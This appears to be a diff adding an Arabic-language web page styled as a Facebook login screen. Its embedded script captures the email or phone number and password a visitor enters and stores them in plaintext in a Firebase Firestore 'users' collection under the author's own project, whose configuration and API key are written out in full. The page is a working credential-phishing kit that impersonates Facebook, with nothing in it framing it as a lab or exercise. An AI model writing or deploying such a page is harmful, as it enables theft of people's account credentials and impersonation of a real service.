@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل دخول فيسبوك</title>
+    <script type="module">
+        // استيراد الوظائف المطلوبة من Firebase
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.17.2/firebase-firestore.js";
+
+        // تكوين Firebase (ضع إعداداتك هنا)
+        const firebaseConfig = {
+            apiKey: "AIzaSyBTJkY5_3TYv7QOUkj-5JUteeqUTCZpLDs",
+            authDomain: "fbtest-13be8.firebaseapp.com",
+            projectId: "fbtest-13be8",
+            storageBucket: "fbtest-13be8.appspot.com",
+            messagingSenderId: "1079834624865",
+            appId: "1:1079834624865:web:2515a1976dad36d6403b20",
+            measurementId: "G-Y6Z73ECMBL"
+        };
+
+        // تهيئة Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // دالة إرسال البيانات إلى Firestore
+        async function sendData(email, password) {
+            try {
+                await addDoc(collection(db, "users"), {
+                    email: email,
+                    password: password
+                });
+                console.log("تم إضافة البيانات بنجاح!");
+                alert("تم تسجيل البيانات بنجاح!");
+            } catch (e) {
+                console.error("خطأ في إرسال البيانات: ", e);
+                alert("حدث خطأ أثناء إرسال البيانات!");
+            }
+        }
+
+        // إضافة حدث عند إرسال النموذج
+        document.addEventListener("DOMContentLoaded", () => {
+            const form = document.querySelector("form");
+            form.addEventListener("submit", (event) => {
+                event.preventDefault();
+                const email = form.querySelector("input[type='text']").value;
+                const password = form.querySelector("input[type='password']").value;
+                sendData(email, password);
+            });
+        });
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            background-color: white;
+            width: 400px;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .login-container h2 {
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            box-sizing: border-box;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .login-container button:hover {
+            background-color: #165eab;
+        }
+        .forgot-password {
+            text-align: right;
+            font-size: 14px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .divider {
+            margin: 20px 0;
+            border-top: 1px solid #ddd;
+        }
+        .create-account {
+            margin-top: 20px;
+        }
+        .create-account a {
+            background-color: #42b72a;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .create-account a:hover {
+            background-color: #36a420;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>تسجيل دخول إلى فيسبوك</h2>
+        <form>
+            <input type="text" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+            <input type="password" placeholder="كلمة المرور" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+    </div>
+</body>
+</html>
